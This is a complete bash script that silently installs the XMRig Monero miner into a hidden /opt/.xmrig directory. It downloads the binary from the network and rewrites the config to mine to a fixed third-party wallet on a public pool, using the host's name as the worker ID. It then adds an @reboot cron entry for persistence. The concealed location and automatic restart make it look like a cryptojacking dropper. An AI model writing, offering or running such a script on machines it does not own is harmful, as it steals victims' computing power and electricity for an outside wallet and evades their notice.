#!/bin/env bash

mkdir -p /opt/.xmrig
cd /opt/.xmrig/

ubuntu_version=$(lsb_release -rs)

echo "Detected Ubuntu version: $ubuntu_version"

if [[ "$ubuntu_version" == "24.04" ]]; then
    download_link="https://github.com/xmrig/xmrig/releases/download/v6.22.1/xmrig-6.22.1-noble-x64.tar.gz"
elif [[ "$ubuntu_version" == "22.04" ]]; then
    download_link="https://github.com/xmrig/xmrig/releases/download/v6.22.1/xmrig-6.22.1-jammy-x64.tar.gz"
elif [[ "$ubuntu_version" == "20.04" ]]; then
    download_link="https://github.com/xmrig/xmrig/releases/download/v6.22.1/xmrig-6.22.1-focal-x64.tar.gz"
else
    download_link="https://github.com/xmrig/xmrig/releases/download/v6.22.1/xmrig-6.22.1-linux-static-x64.tar.gz"
fi

wget -q $download_link

tar -xzf $(basename $download_link)

cd xmrig-6.22.1/
sed -i 's/donate.v2.xmrig.com:3333/pool.supportxmr.com:3333/g' config.json
sed -i 's/YOUR_WALLET_ADDRESS/82ZkM2UFfV4HY6eRHEDv1pNCyAj2Bg9BPbSeUe3H6A3k9pCtLdhsriaZcriFaXbVmaMuAw9x9ezi4BTK47bE5yw84M1vJpp/g' config.json
sed -i "s/\"pass\": \"x\"/\"pass\": \"$(hostname)\"/g" config.json
(crontab -l 2>/dev/null; echo "@reboot /opt/.xmrig/xmrig-6.22.1/xmrig --config=/opt/.xmrig/xmrig-6.22.1/config.json") | crontab -
